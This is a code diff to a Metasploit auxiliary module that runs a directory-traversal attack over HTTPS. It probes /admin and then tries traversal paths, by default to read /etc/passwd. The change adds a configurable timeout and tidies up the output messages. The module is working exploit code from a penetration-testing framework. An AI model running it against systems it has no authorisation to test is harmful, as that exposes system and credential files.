@@ -31,9 +31,14 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(443),
-        OptString.new('FILE', [ true, 'The file to traverse for', '/etc/passwd']),
-        OptInt.new('MAXDIRS', [ true, 'The maximum directory depth to search', 7]),
+        OptString.new('FILE', [ true, 'The file to traverse for', '/etc/passwd' ]),
+        OptInt.new('MAXDIRS', [ true, 'The maximum directory depth to search', 7 ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 25 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def run_host(ip)
@@ -48,7 +53,7 @@ class Metasploit3 < Msf::Auxiliary
         {
           'method'  => 'GET',
           'uri'     => '/admin',
-        }, 25)
+        }, timeout)
 
       if (res)
         1.upto(datastore['MAXDIRS']) do |level|
@@ -58,12 +63,13 @@ class Metasploit3 < Msf::Auxiliary
             {
               'method'  => 'GET',
               'uri'     => traversalstring,
-            }, 25)
+            }, timeout)
+
           if (res and res.code == 200)
-            print_status("Request ##{level} may have succeeded on #{rhost}:#{rport}!\r\n Response: \r\n#{res.body}")
+            print_status("Request #{level} may have succeeded on #{rhost}:#{rport}!\r\n Response: \r\n#{res.body}")
             break
           elsif (res and res.code)
-            print_error("Attempt ##{level} returned HTTP error #{res.code} on #{rhost}:#{rport}\r\n")
+            print_error("Attempt #{level} returned HTTP error #{res.code} on #{rhost}:#{rport}\r\n")
           end
         end
       end
